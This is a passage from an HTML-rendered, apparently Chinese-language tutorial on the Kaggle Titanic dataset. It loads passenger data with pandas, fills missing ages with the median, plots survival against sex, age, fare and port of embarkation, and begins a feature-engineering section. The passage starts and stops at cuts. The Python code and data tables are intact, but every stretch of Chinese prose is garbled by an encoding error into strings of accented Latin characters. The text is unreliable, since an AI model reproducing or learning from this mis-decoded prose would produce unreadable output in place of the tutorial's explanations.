”ç©¶æ•°æ®å¹¶å»ºç«‹æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªç›´è§‰ã€‚</p><p>åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†åšå››ä»¶äº‹ã€‚</p><ul><li>æ•°æ®æå–ï¼šæˆ‘ä»¬å°†åŠ è½½æ•°æ®é›†å¹¶é¦–å…ˆæŸ¥çœ‹å®ƒã€‚</li><li>æ¸…æ´ï¼šæˆ‘ä»¬å°†å¡«å†™ç¼ºå¤±å€¼ã€‚</li><li>ç»˜å›¾ï¼šæˆ‘ä»¬å°†åˆ›å»ºä¸€äº›æœ‰è¶£çš„å›¾è¡¨ï¼Œè¿™äº›å›¾è¡¨ï¼ˆå¸Œæœ›ï¼‰å¯ä»¥å‘ç°æ•°æ®ä¸­çš„ç›¸å…³æ€§å’Œéšè—çš„è§è§£ã€‚</li><li>å‡è®¾ï¼šæˆ‘ä»¬å°†ä»å›¾è¡¨ä¸­æå‡ºå‡è®¾ã€‚</li></ul><p>æˆ‘ä»¬ç¨å¾®è°ƒæ•´äº†è¿™æ¬¾ç¬”è®°æœ¬çš„é£æ ¼ï¼Œä»¥ä¾¿ç”»å›¾å±…ä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> IPython.core.display <span class="keyword">import</span> HTML</span><br><span class="line">HTML(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;style&gt;</span></span><br><span class="line"><span class="string">.output_png &#123;</span></span><br><span class="line"><span class="string">    display: table-cell;</span></span><br><span class="line"><span class="string">    text-align: center;</span></span><br><span class="line"><span class="string">    vertical-align: middle;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;/style&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¯¼å…¥æœ‰ç”¨çš„åŒ…ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">%matplotlib inline</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">warnings.filterwarnings(<span class="string">&#x27;ignore&#x27;</span>, category=DeprecationWarning)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">pd.options.display.max_columns = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pylab <span class="keyword">as</span> plot</span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&#x27;axes.labelsize&#x27;</span>: <span class="string">&quot;large&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;xtick.labelsize&#x27;</span>: <span class="string">&#x27;x-large&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;legend.fontsize&#x27;</span>: <span class="number">20</span>,</span><br><span class="line">    <span class="string">&#x27;figure.dpi&#x27;</span>: <span class="number">150</span>,</span><br><span class="line">    <span class="string">&#x27;figure.figsize&#x27;</span>: [<span class="number">25</span>, <span class="number">7</span>]</span><br><span class="line">&#125;</span><br><span class="line">plot.rcParams.update(params)</span><br></pre></td></tr></table></figure><p>æœ‰ä¸¤ä¸ªæ•°æ®é›†ï¼šè®­ç»ƒé›†å’Œæµ‹è¯•é›†ã€‚æˆ‘ä»¬å°†ä½¿ç”¨è®­ç»ƒé›†æ¥æ„å»ºæˆ‘ä»¬çš„é¢„æµ‹æ¨¡å‹ï¼Œç”¨æµ‹è¯•é›†æ¥å¯¹å…¶è¿›è¡Œè¯„åˆ†å¹¶ç”Ÿæˆè¾“å‡ºæ–‡ä»¶ä»¥åœ¨Kaggleè¯„ä¼°ç³»ç»Ÿä¸Šæäº¤ã€‚</p><p>æˆ‘ä»¬å°†åœ¨æœ¬æ–‡æœ«å°¾çœ‹åˆ°è¿™ä¸ªè¿‡ç¨‹æ˜¯å¦‚ä½•å®Œæˆçš„ã€‚</p><p>ç°åœ¨è®©æˆ‘ä»¬å¼€å§‹åŠ è½½è®­ç»ƒé›†ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = pd.read_csv(<span class="string">&#x27;./data/train.csv&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> data.shape</span><br></pre></td></tr></table></figure><pre><code>(891, 12)</code></pre><p>æˆ‘ä»¬å¾—åˆ°:</p><ul><li>891 è¡Œ</li><li>12 åˆ—</li></ul><p>Pandas å…è®¸ä½ é¸Ÿç°æ•°æ®ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.head()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>PassengerId</th>      <th>Survived</th>      <th>Pclass</th>      <th>Name</th>      <th>Sex</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Ticket</th>      <th>Fare</th>      <th>Cabin</th>      <th>Embarked</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>1</td>      <td>0</td>      <td>3</td>      <td>Braund, Mr. Owen Harris</td>      <td>male</td>      <td>22.0</td>      <td>1</td>      <td>0</td>      <td>A/5 21171</td>      <td>7.2500</td>      <td>NaN</td>      <td>S</td>    </tr>    <tr>      <th>1</th>      <td>2</td>      <td>1</td>      <td>1</td>      <td>Cumings, Mrs. John Bradley (Florence Briggs Th...</td>      <td>female</td>      <td>38.0</td>      <td>1</td>      <td>0</td>      <td>PC 17599</td>      <td>71.2833</td>      <td>C85</td>      <td>C</td>    </tr>    <tr>      <th>2</th>      <td>3</td>      <td>1</td>      <td>3</td>      <td>Heikkinen, Miss. Laina</td>      <td>female</td>      <td>26.0</td>      <td>0</td>      <td>0</td>      <td>STON/O2. 3101282</td>      <td>7.9250</td>      <td>NaN</td>      <td>S</td>    </tr>    <tr>      <th>3</th>      <td>4</td>      <td>1</td>      <td>1</td>      <td>Futrelle, Mrs. Jacques Heath (Lily May Peel)</td>      <td>female</td>      <td>35.0</td>      <td>1</td>      <td>0</td>      <td>113803</td>      <td>53.1000</td>      <td>C123</td>      <td>S</td>    </tr>    <tr>      <th>4</th>      <td>5</td>      <td>0</td>      <td>3</td>      <td>Allen, Mr. William Henry</td>      <td>male</td>      <td>35.0</td>      <td>0</td>      <td>0</td>      <td>373450</td>      <td>8.0500</td>      <td>NaN</td>      <td>S</td>    </tr>  </tbody></table><p><code>Survived</code> åˆ—æ˜¯ <strong>ç›®æ ‡å˜é‡</strong>ã€‚ å¦‚æœ <code>Survived</code> ä¸º 1ï¼Œä¹˜å®¢å¹¸å…äºéš¾ï¼Œå¦åˆ™ä»–å·²ç»æ­»äº†ã€‚è¿™æ˜¯æˆ‘ä»¬è¦é¢„æµ‹çš„å˜é‡ã€‚</p><p>å…¶ä»–å˜é‡æè¿°äº†ä¹˜å®¢ã€‚ å®ƒä»¬æ˜¯ <strong>ç‰¹å¾</strong>ã€‚</p><ul><li><code>PassengerId</code>ï¼šèˆ¹ä¸Šæ¯ä½æ—…å®¢çš„èº«ä»½è¯æ˜</li><li><code>Pclass</code>ï¼šä¹˜å®¢ç­‰çº§ã€‚ å®ƒæœ‰ä¸‰ä¸ªå¯èƒ½çš„å€¼ï¼š1ï¼Œ2ï¼Œ3ï¼ˆç¬¬ä¸€ï¼Œç¬¬äºŒå’Œç¬¬ä¸‰ç±»ï¼‰</li><li><code>Name</code>ï¼šPassegerçš„åå­—</li><li><code>Sex</code>ï¼šæ€§åˆ«</li><li><code>Age</code>ï¼šå¹´é¾„</li><li><code>SibSp</code>ï¼šä¸ä¹˜å®¢ä¸€èµ·æ—…è¡Œçš„å…„å¼Ÿå§å¦¹å’Œé…å¶çš„æ•°é‡</li><li><code>Parch</code>ï¼šä¸ä¹˜å®¢ä¸€èµ·æ—…è¡Œçš„çˆ¶æ¯å’Œå­©å­çš„æ•°é‡</li><li><code>Ticket</code>ï¼šèˆ¹ç¥¨å·ç </li><li><code>Fare</code>ï¼šç¥¨ä»·</li><li><code>Cabin</code>ï¼šèˆ¹èˆ±å·ç </li><li><code>Embarked</code>ï¼šè¿™æè¿°äº†äººä»¬ç™»ä¸Šçš„æ³°å¦å°¼å…‹å·çš„ä¸‰ä¸ªå¯èƒ½åŒºåŸŸã€‚ ä¸‰ä¸ªå¯èƒ½çš„å€¼ Sï¼ŒCï¼ŒQ</li></ul><p>Pandas å…è®¸æ‚¨å¯¹æ•°å­—ç‰¹å¾è¿›è¡Œé«˜çº§ç®€å•çš„ç»Ÿè®¡æè¿°ã€‚è¿™å¯ä»¥ä½¿ç”¨ <code>describe</code> æ–¹æ³•å®Œæˆã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.describe()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>PassengerId</th>      <th>Survived</th>      <th>Pclass</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Fare</th>    </tr>  </thead>  <tbody>    <tr>      <th>count</th>      <td>891.000000</td>      <td>891.000000</td>      <td>891.000000</td>      <td>714.000000</td>      <td>891.000000</td>      <td>891.000000</td>      <td>891.000000</td>    </tr>    <tr>      <th>mean</th>      <td>446.000000</td>      <td>0.383838</td>      <td>2.308642</td>      <td>29.699118</td>      <td>0.523008</td>      <td>0.381594</td>      <td>32.204208</td>    </tr>    <tr>      <th>std</th>      <td>257.353842</td>      <td>0.486592</td>      <td>0.836071</td>      <td>14.526497</td>      <td>1.102743</td>      <td>0.806057</td>      <td>49.693429</td>    </tr>    <tr>      <th>min</th>      <td>1.000000</td>      <td>0.000000</td>      <td>1.000000</td>      <td>0.420000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>    </tr>    <tr>      <th>25%</th>      <td>223.500000</td>      <td>0.000000</td>      <td>2.000000</td>      <td>20.125000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>7.910400</td>    </tr>    <tr>      <th>50%</th>      <td>446.000000</td>      <td>0.000000</td>      <td>3.000000</td>      <td>28.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>14.454200</td>    </tr>    <tr>      <th>75%</th>      <td>668.500000</td>      <td>1.000000</td>      <td>3.000000</td>      <td>38.000000</td>      <td>1.000000</td>      <td>0.000000</td>      <td>31.000000</td>    </tr>    <tr>      <th>max</th>      <td>891.000000</td>      <td>1.000000</td>      <td>3.000000</td>      <td>80.000000</td>      <td>8.000000</td>      <td>6.000000</td>      <td>512.329200</td>    </tr>  </tbody></table><p><code>count</code> å˜é‡æ˜¾ç¤º <code>Age</code> åˆ—ä¸­ç¼ºå°‘177ä¸ªå€¼ã€‚</p><p>ä¸€ç§è§£å†³æ–¹æ¡ˆæ˜¯ç”¨ä¸­å€¼å¹´é¾„å¡«å……ç©ºå€¼ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨å¹³å‡å¹´é¾„æ¥ä¼°ç®—ï¼Œä½†ä¸­ä½æ•°å¯¹å¼‚å¸¸å€¼æ›´ä¸ºç¨³å¥ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data[<span class="string">&#x27;Age&#x27;</span>] = data[<span class="string">&#x27;Age&#x27;</span>].fillna(data[<span class="string">&#x27;Age&#x27;</span>].median())</span><br></pre></td></tr></table></figure><p>è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ç»“æœã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.describe()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>PassengerId</th>      <th>Survived</th>      <th>Pclass</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Fare</th>    </tr>  </thead>  <tbody>    <tr>      <th>count</th>      <td>891.000000</td>      <td>891.000000</td>      <td>891.000000</td>      <td>891.000000</td>      <td>891.000000</td>      <td>891.000000</td>      <td>891.000000</td>    </tr>    <tr>      <th>mean</th>      <td>446.000000</td>      <td>0.383838</td>      <td>2.308642</td>      <td>29.361582</td>      <td>0.523008</td>      <td>0.381594</td>      <td>32.204208</td>    </tr>    <tr>      <th>std</th>      <td>257.353842</td>      <td>0.486592</td>      <td>0.836071</td>      <td>13.019697</td>      <td>1.102743</td>      <td>0.806057</td>      <td>49.693429</td>    </tr>    <tr>      <th>min</th>      <td>1.000000</td>      <td>0.000000</td>      <td>1.000000</td>      <td>0.420000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>    </tr>    <tr>      <th>25%</th>      <td>223.500000</td>      <td>0.000000</td>      <td>2.000000</td>      <td>22.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>7.910400</td>    </tr>    <tr>      <th>50%</th>      <td>446.000000</td>      <td>0.000000</td>      <td>3.000000</td>      <td>28.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>14.454200</td>    </tr>    <tr>      <th>75%</th>      <td>668.500000</td>      <td>1.000000</td>      <td>3.000000</td>      <td>35.000000</td>      <td>1.000000</td>      <td>0.000000</td>      <td>31.000000</td>    </tr>    <tr>      <th>max</th>      <td>891.000000</td>      <td>1.000000</td>      <td>3.000000</td>      <td>80.000000</td>      <td>8.000000</td>      <td>6.000000</td>      <td>512.329200</td>    </tr>  </tbody></table><p>å®Œç¾ã€‚</p><p>æˆ‘ä»¬ç°åœ¨åˆ¶ä½œä¸€äº›å›¾è¡¨ã€‚è®©æˆ‘ä»¬æ ¹æ®æ€§åˆ«æ¥çœ‹å¾…ç”Ÿå­˜ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data[<span class="string">&#x27;Died&#x27;</span>] = <span class="number">1</span> - data[<span class="string">&#x27;Survived&#x27;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.groupby(<span class="string">&#x27;Sex&#x27;</span>).agg(<span class="string">&#x27;sum&#x27;</span>)[[<span class="string">&#x27;Survived&#x27;</span>, <span class="string">&#x27;Died&#x27;</span>]].plot(kind=<span class="string">&#x27;bar&#x27;</span>, figsize=(<span class="number">25</span>, <span class="number">7</span>),</span><br><span class="line">                                                          stacked=<span class="literal">True</span>, colors=[<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;r&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/1.png" alt="png"></p><p>çœ‹èµ·æ¥ç”·æ€§ä¹˜å®¢æ›´å®¹æ˜“æ­»äº¡ã€‚è®©æˆ‘ä»¬ç»˜åˆ¶ç›¸åŒçš„å›¾å½¢ï¼Œä½†ç”¨æ¯”ä¾‹ä»£æ›¿ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data.groupby(<span class="string">&#x27;Sex&#x27;</span>).agg(<span class="string">&#x27;mean&#x27;</span>)[[<span class="string">&#x27;Survived&#x27;</span>, <span class="string">&#x27;Died&#x27;</span>]].plot(kind=<span class="string">&#x27;bar&#x27;</span>, figsize=(<span class="number">25</span>, <span class="number">7</span>), </span><br><span class="line">                                                           stacked=<span class="literal">True</span>, colors=[<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;r&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/2.png" alt="png"></p><p>æ€§åˆ«å˜é‡ä¼¼ä¹æ˜¯ä¸€ç§æ­§è§†æ€§ç‰¹å¾ã€‚å¥³æ€§æ›´æœ‰å¯èƒ½ç”Ÿå­˜ã€‚</p><p>ç°åœ¨è®©æˆ‘ä»¬å°†ç”Ÿå­˜ä¸å¹´é¾„å˜é‡è”ç³»èµ·æ¥ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fig = plt.figure(figsize=(<span class="number">25</span>, <span class="number">7</span>))</span><br><span class="line">sns.violinplot(x=<span class="string">&#x27;Sex&#x27;</span>, y=<span class="string">&#x27;Age&#x27;</span>, </span><br><span class="line">               hue=<span class="string">&#x27;Survived&#x27;</span>, data=data, </span><br><span class="line">               split=<span class="literal">True</span>,</span><br><span class="line">               palette=&#123;<span class="number">0</span>: <span class="string">&quot;r&quot;</span>, <span class="number">1</span>: <span class="string">&quot;g&quot;</span>&#125;</span><br><span class="line">              );</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/3.png" alt="png"></p><p>æ­£å¦‚æˆ‘ä»¬åœ¨ä¸Šé¢çš„å›¾è¡¨ä¸­çœ‹åˆ°å¹¶é€šè¿‡ä»¥ä¸‹æ–¹å¼éªŒè¯ï¼š</p><ul><li>å¥³æ€§çš„ç”Ÿå­˜ç‡é«˜äºç”·æ€§ï¼Œå¦‚è¾ƒå¤§çš„å¥³æ€§ç»¿è‰²ç›´æ–¹å›¾æ‰€ç¤º</li></ul><p>ç°åœ¨ï¼Œæˆ‘ä»¬çœ‹åˆ°ï¼š</p><ul><li><p>å¹´é¾„ä¸ºç”·æ€§ä¹˜å®¢çš„ç”Ÿå­˜ï¼š</p><ul><li>å¹´è½»çš„ç”·æ€§å€¾å‘äºç”Ÿå­˜Â Â * 20è‡³40å²ä¹‹é—´çš„å¤§é‡ä¹˜å®¢æ­»äº¡</li></ul></li><li><p>å¹´é¾„ä¼¼ä¹æ²¡æœ‰å¯¹å¥³æ€§ç”Ÿå­˜äº§ç”Ÿç›´æ¥å½±å“</p></li></ul><p>ä»¥ä¸‹å°æç´æƒ…èŠ‚è¯å®ï¼Œåœ¨é‡åˆ°å¨èƒçš„æƒ…å†µä¸‹ï¼Œæ°´æ‰‹å’Œèˆ¹é•¿éµå®ˆä¸€æ¡æ—§çš„è¡Œä¸ºå‡†åˆ™ï¼šâ€œ<strong>å¦‡å¥³å’Œå„¿ç«¥ä¼˜å…ˆï¼</strong>â€ã€‚</p><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/titanic.jpg" alt="png"></p><p>å¯¹å—ï¼Ÿ</p><p>ç°åœ¨è®©æˆ‘ä»¬å…³æ³¨æ¯ä½ä¹˜å®¢çš„ç¥¨ä»·ï¼Œçœ‹çœ‹å®ƒå¦‚ä½•å½±å“ç”Ÿå­˜ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">figure = plt.figure(figsize=(<span class="number">25</span>, <span class="number">7</span>))</span><br><span class="line">plt.hist([data[data[<span class="string">&#x27;Survived&#x27;</span>] == <span class="number">1</span>][<span class="string">&#x27;Fare&#x27;</span>], data[data[<span class="string">&#x27;Survived&#x27;</span>] == <span class="number">0</span>][<span class="string">&#x27;Fare&#x27;</span>]], </span><br><span class="line">         stacked=<span class="literal">True</span>, color = [<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;r&#x27;</span>],</span><br><span class="line">         bins = <span class="number">50</span>, label = [<span class="string">&#x27;Survived&#x27;</span>,<span class="string">&#x27;Dead&#x27;</span>])</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Fare&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Number of passengers&#x27;</span>)</span><br><span class="line">plt.legend();</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/4.png" alt="png"></p><p>ç¥¨ä»·è¾ƒä½çš„ä¹˜å®¢æ›´å®¹æ˜“æ­»äº¡ã€‚æ¢å¥è¯è¯´ï¼Œæ‹¥æœ‰æ›´æ˜‚è´µé—¨ç¥¨ï¼Œå› æ­¤æ›´é‡è¦çš„ç¤¾ä¼šåœ°ä½çš„ä¹˜å®¢ä¼¼ä¹é¦–å…ˆè·æ•‘ã€‚</p><p>å¥½çš„ï¼Œè¿™å¾ˆå¥½ã€‚ ç°åœ¨è®©æˆ‘ä»¬å°†å¹´é¾„ï¼Œç¥¨ä»·å’Œç”Ÿå­˜ç»“åˆåœ¨ä¸€å¼ å›¾è¡¨ä¸Šã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">25</span>, <span class="number">7</span>))</span><br><span class="line">ax = plt.subplot()</span><br><span class="line"></span><br><span class="line">ax.scatter(data[data[<span class="string">&#x27;Survived&#x27;</span>] == <span class="number">1</span>][<span class="string">&#x27;Age&#x27;</span>], data[data[<span class="string">&#x27;Survived&#x27;</span>] == <span class="number">1</span>][<span class="string">&#x27;Fare&#x27;</span>], </span><br><span class="line">           c=<span class="string">&#x27;green&#x27;</span>, s=data[data[<span class="string">&#x27;Survived&#x27;</span>] == <span class="number">1</span>][<span class="string">&#x27;Fare&#x27;</span>])</span><br><span class="line">ax.scatter(data[data[<span class="string">&#x27;Survived&#x27;</span>] == <span class="number">0</span>][<span class="string">&#x27;Age&#x27;</span>], data[data[<span class="string">&#x27;Survived&#x27;</span>] == <span class="number">0</span>][<span class="string">&#x27;Fare&#x27;</span>], </span><br><span class="line">           c=<span class="string">&#x27;red&#x27;</span>, s=data[data[<span class="string">&#x27;Survived&#x27;</span>] == <span class="number">0</span>][<span class="string">&#x27;Fare&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/5.png" alt="png"></p><p>åœ†åœˆçš„å¤§å°ä¸ç¥¨ä»·æˆæ­£æ¯”ã€‚</p><p>åœ¨ x è½´ä¸Šï¼Œæˆ‘ä»¬æœ‰å¹´é¾„ï¼Œåœ¨ y è½´ï¼Œæˆ‘ä»¬è€ƒè™‘ç¥¨ä»·ã€‚</p><p>æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿä¸åŒçš„é›†ç¾¤ï¼š</p><ol><li>x = 20 å’Œ x = 45 ä¹‹é—´çš„å¤§ç»¿ç‚¹ï¼šç¥¨ä»·æœ€é«˜çš„æˆäºº</li><li>x = 10 å’Œ x = 45 ä¹‹é—´çš„å°çº¢ç‚¹ï¼Œèˆ¹ä¸Šè¾ƒä½çº§åˆ«çš„æˆå¹´äºº</li><li>x = 0 å’Œ x = 7 ä¹‹é—´çš„å°å¯†é›†ç‚¹ï¼šè¿™äº›æ˜¯è¢«ä¿å­˜çš„å­©å­</li></ol><p>äº‹å®ä¸Šï¼Œç¥¨ä»·ä¸æˆ‘ä»¬åœ¨ä¸‹é¢çš„å›¾è¡¨ä¸­çœ‹åˆ°çš„ç±»åˆ«ç›¸å…³ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ax = plt.subplot()</span><br><span class="line">ax.set_ylabel(<span class="string">&#x27;Average fare&#x27;</span>)</span><br><span class="line">data.groupby(<span class="string">&#x27;Pclass&#x27;</span>).mean()[<span class="string">&#x27;Fare&#x27;</span>].plot(kind=<span class="string">&#x27;bar&#x27;</span>, figsize=(<span class="number">25</span>, <span class="number">7</span>), ax = ax);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/6.png" alt="png"></p><p>ç°åœ¨è®©æˆ‘ä»¬çœ‹çœ‹ç™»èˆ¹åœ°ç‚¹å¦‚ä½•å½±å“ç”Ÿå­˜ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fig = plt.figure(figsize=(<span class="number">25</span>, <span class="number">7</span>))</span><br><span class="line">sns.violinplot(x=<span class="string">&#x27;Embarked&#x27;</span>, y=<span class="string">&#x27;Fare&#x27;</span>, hue=<span class="string">&#x27;Survived&#x27;</span>, data=data, split=<span class="literal">True</span>, palette=&#123;<span class="number">0</span>: <span class="string">&quot;r&quot;</span>, <span class="number">1</span>: <span class="string">&quot;g&quot;</span>&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qiwihui/How-to-score-0.8134-in-Titanic-Kaggle-Challenge/master/images/article_1/7.png" alt="png"></p><p>ä¼¼ä¹ç™»èˆ¹åœ°ç‚¹ C çš„ç¥¨ä»·èŒƒå›´æ›´å¹¿ï¼Œå› æ­¤æ”¯ä»˜æœ€é«˜ä»·æ ¼çš„ä¹˜å®¢æ˜¯é‚£äº›å¹¸å­˜çš„ä¹˜å®¢ã€‚</p><p>æˆ‘ä»¬ä¹Ÿçœ‹åˆ°è¿™ç§æƒ…å†µå‘ç”Ÿåœ¨ç™»èˆ¹åœ°ç‚¹ S è€Œä¸æ˜¯ç™»èˆ¹åœ°ç‚¹ Qã€‚</p><p>ç°åœ¨è®©æˆ‘ä»¬åœæ­¢æ•°æ®æ¢ç´¢å¹¶åˆ‡æ¢åˆ°ä¸‹ä¸€éƒ¨åˆ†ã€‚</p><h2><span id="ii-te-zheng-gong-cheng">II - ç‰¹å¾å·¥ç¨‹</span></h2><p>åœ¨å‰ä¸€éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬è°ƒæŸ¥äº†æ•°æ®å¹¶å‘ç°äº†ä¸€äº›æœ‰è¶£çš„ç›¸å…³æ€§ã€‚</p><p>åœ¨è¿™ä¸€éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬å°†çœ‹åˆ°å¦‚ä½•å¤„ç†å’Œè½¬æ¢è¿™äº›å˜é‡ï¼Œä½¿æ•°æ®å˜å¾—å¯ä»¥é€šè¿‡æœºå™¨å­¦ä¹ ç®—æ³•è¿›è¡Œç®¡ç†ã€‚</p><p>æˆ‘ä»¬è¿˜å°†åˆ›å»ºæˆ–â€œè®¾è®¡â€åœ¨æ„å»ºæ¨¡å‹æ—¶æœ‰ç”¨çš„å…¶ä»–åŠŸèƒ½ã€‚</p><p>æˆ‘ä»¬å°†åœ¨æ­¤è¿‡ç¨‹ä¸­çœ‹åˆ°å¦‚ä½•å¤„ç†æ–‡æœ¬å˜é‡ï¼ˆå¦‚ä¹˜å®¢å§“åï¼‰å¹¶å°†æ­¤ä¿¡æ¯é›†æˆåˆ°æˆ‘ä»¬çš„æ¨¡å‹ä¸­ã€‚</p><p>ä¸ºäº†æ›´åŠ æ¸…æ™°ï¼Œæˆ‘ä»¬å°†ä»£ç åˆ†æ•£åœ¨å•ç‹¬çš„å‡½æ•°ä¸­ã€‚</p><p>ä½†é¦–å…ˆï¼Œè®©æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªæ‰“å°å‡½æ•°ï¼Œæ–­è¨€æ˜¯å¦å·²ç»å¤„ç†äº†ä¸€ä¸ªç‰¹å¾ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">status</span>(<span class="params">feature</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Processing&#x27;</span>, feature, <span class="string">&#x27;: ok&#x27;</span></span><br></pre></td></tr></table></figure><h3><span id="jia-zai-shu-ju">åŠ è½½æ•°æ®</span></h3><p>å¯åŠ¨æœºå™¨å­¦ä¹ é—®é¢˜çš„ä¸€ä¸ªæŠ€å·§æ˜¯å°†è®­ç»ƒé›†ä¸€èµ·é™„åŠ åˆ°æµ‹è¯•é›†ã€‚</p><p>æˆ‘ä»¬å°†ä½¿ç”¨è®­ç»ƒé›†è¿›è¡Œç‰¹å¾å·¥ç¨‹ä»¥é˜²æ­¢ä¿¡æ¯æ³„æ¼ã€‚ç„¶åæˆ‘ä»¬å°†è¿™äº›å˜é‡æ·»åŠ åˆ°æµ‹è¯•é›†ä¸­ã€‚</p><p>è®©æˆ‘ä»¬åŠ è½½è®­ç»ƒé›†å’Œæµ‹è¯•é›†å¹¶å°†å®ƒä»¬åˆåœ¨ä¸€èµ·ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_combined_data</span>():</span><br><span class="line">    <span class="comment"># reading train data</span></span><br><span class="line">    train = pd.read_csv(<span class="string">&#x27;./data/train.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># reading test data</span></span><br><span class="line">    test = pd.read_csv(<span class="string">&#x27;./data/test.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># extracting and then removing the targets from the training data </span></span><br><span class="line">    targets = train.Survived</span><br><span class="line">    train.drop([<span class="string">&#x27;Survived&#x27;</span>], <span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># merging train data and test data for future feature engineering</span></span><br><span class="line">    <span class="comment"># we&#x27;ll also remove the PassengerID since this is not an informative feature</span></span><br><span class="line">    combined = train.append(test)</span><br><span class="line">    combined.reset_index(inplace=<span class="literal">True</span>)</span><br><span class="line">    combined.drop([<span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;PassengerId&#x27;</span>], inplace=<span class="literal">True</span>, axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = 